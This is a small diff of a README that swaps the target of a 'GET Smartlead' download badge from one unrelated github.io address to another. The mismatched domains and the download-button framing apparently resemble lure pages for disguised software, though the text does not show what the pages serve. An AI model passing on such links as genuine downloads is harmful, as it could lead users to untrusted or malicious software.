@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=661dd5c6e07c089d57f978292d217a56069915a5-5529172-images-thumbs&n=13)
 
-[![GET Smartlead](https://img.shields.io/badge/GET%20%E2%80%94%20Smartlead-0078D6?style=for-the-badge&logoColor=white)](https://tpm-health-diagnostic-tools.github.io/.github/smartlead-ai)
+[![GET Smartlead](https://img.shields.io/badge/GET%20%E2%80%94%20Smartlead-0078D6?style=for-the-badge&logoColor=white)](https://chasepersonzvvs.github.io/.github/smartlead-ai)
 
 ---
 
